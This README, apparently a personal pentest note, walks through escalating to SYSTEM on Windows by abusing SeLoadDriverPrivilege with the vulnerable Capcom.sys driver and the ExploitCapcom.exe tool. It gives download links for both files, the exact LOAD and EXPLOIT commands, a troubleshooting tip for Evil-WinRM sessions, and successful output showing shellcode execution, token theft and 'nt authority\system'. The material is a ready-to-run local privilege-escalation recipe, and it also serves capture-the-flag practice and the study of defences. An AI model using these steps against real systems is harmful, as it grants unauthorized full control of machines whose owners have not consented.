# SeLoadDriverPrivilegeExp
Exploit SeLoadDriverPrivilege for windows, note by manesec.

## Need

Need two file `Capcom.sys` and `ExploitCapcom.exe`.

`ExploitCapcom.exe` can download from [here](https://github.com/clubby789/ExploitCapcom/releases), or git clone this.

`Capcom.sys` can download from [here](https://m4t3sz.gitlab.io/posts/htb/fuse/expl/seloaddriverpriv/Capcom.sys), or git clone this.

## Exploit

**NOTE**: Please use the absolute path !!!!!

```powershell
ExploitCapcom.exe LOAD C:\mane\Capcom.sys
ExploitCapcom.exe EXPLOIT whoami
```

Failed message:

```powershell
C:\mane>ExploitCapcom.exe EXPLOIT whoami
ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[-] CreateFile failed
```

I found that when you are trying to exploit via `Evil-WinRM`, it will be failed. 

```powershell
*Evil-WinRM* PS C:\mane> ./ExploitCapcom.exe LOAD C:\mane\Capcom.sys
[*] Service Name: whqobdxtø/°È
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????????
NTSTATUS: c0000034, WinError: 0
*Evil-WinRM* PS C:\mane> ./ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[-] CreateFile failed
```

**You may need to spawn CMD shell to exploit it.**

When it **Success**, it will return:

```powershell
C:\mane>ExploitCapcom.exe LOAD C:\\mane\Capcom.sys
ExploitCapcom.exe LOAD C:\\mane\Capcom.sys
[*] Service Name: iihqptxj��tE]
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????????
NTSTATUS: 00000000, WinError: 0
C:\mane>ExploitCapcom.exe EXPLOIT whoami
ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 000001BCE4D10008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system
C:\mane>
```

## Thanks

+ `Capcom.sys` From M4t35Z's Blog
+ `ExploitCapcom.exe` From clubby789
